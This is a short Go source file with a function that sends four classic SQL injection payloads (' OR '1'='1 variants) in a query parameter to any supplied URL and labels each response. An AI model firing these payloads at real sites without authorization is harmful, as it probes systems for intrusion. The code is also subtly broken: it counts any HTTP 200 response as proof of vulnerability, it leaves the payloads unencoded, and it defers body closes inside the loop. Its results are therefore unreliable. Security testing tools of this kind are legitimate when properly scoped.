package tools

import (
	"fmt"
	"net/http"
)

type SQLInjectionResult struct {
	URL       string
	Vulnerable bool
}

func TestSQLInjection(baseURL string) []SQLInjectionResult {
	payloads := []string{
		"' OR '1'='1",
		"' OR '1'='1' -- ",
		"' OR '1'='1' /* ",
		"' OR '1'='1' #",
	}

	results := []SQLInjectionResult{}

	for _, payload := range payloads {
		url := fmt.Sprintf("%s?param=%s", baseURL, payload)
		fmt.Printf("Testing URL: %s\n", url)

		resp, err := http.Get(url)
		if err != nil {
			results = append(results, SQLInjectionResult{URL: url, Vulnerable: false})
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			results = append(results, SQLInjectionResult{URL: url, Vulnerable: true})
		} else {
			results = append(results, SQLInjectionResult{URL: url, Vulnerable: false})
		}
	}

	return results
}

